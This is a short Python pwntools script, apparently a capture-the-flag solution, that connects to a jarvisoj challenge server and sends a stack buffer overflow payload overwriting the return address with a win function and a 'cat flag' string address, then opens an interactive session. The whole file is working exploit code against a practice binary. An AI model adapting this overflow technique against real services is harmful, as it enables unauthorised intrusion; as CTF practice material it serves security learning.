from pwn import *

n = remote('pwn2.jarvisoj.com', 9876)
#n = process('./memory')
elf = ELF('./memory')

win_func_addr = 0x080485BD
cat_flag_addr = 0x080487E0

offset = 0x13 + 4

n.recv()
payload = 'a' * offset + p32(win_func_addr) + p32(cat_flag_addr) *2
n.sendline(payload)
n.interactive()
